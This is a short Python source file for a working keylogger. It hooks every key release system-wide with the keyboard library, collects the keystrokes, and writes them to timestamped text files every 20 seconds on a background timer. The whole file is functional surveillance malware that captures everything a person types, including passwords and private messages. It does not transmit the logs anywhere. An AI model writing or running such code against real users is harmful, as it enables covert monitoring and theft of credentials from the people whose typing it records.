import keyboard

from threading import Timer

import datetime

TIMECYCLE=20
class Keylogger:
    def __init__(self,intervaltime):
        self.interval=intervaltime
        self.log=""


    def callback(self,event):
        name=event.name
        if len(name)>1:
            if name=="space":
                name=" "
            elif name=="enter":
                name="ENTER\n"


        self.log+=name

    def Write_To_File(self):
        now=datetime.datetime.now()
        filename=f'{now.strftime("%m-%d-%Y_%H_%M_%S")}.txt'
        f=open(filename,'w')
        print(self.log, file = f)
        print("log File has written")
        self.log=""
    def getlog(self):
        
        if self.log:
            self.Write_To_File()
        timer=Timer(interval=self.interval,function=self.getlog)
        timer.daemon=True

        timer.start()

    def start(self):
        keyboard.on_release(callback=self.callback)
        self.getlog()
        keyboard.wait()
        print("Test is starting")
k=Keylogger(TIMECYCLE)
k.start()
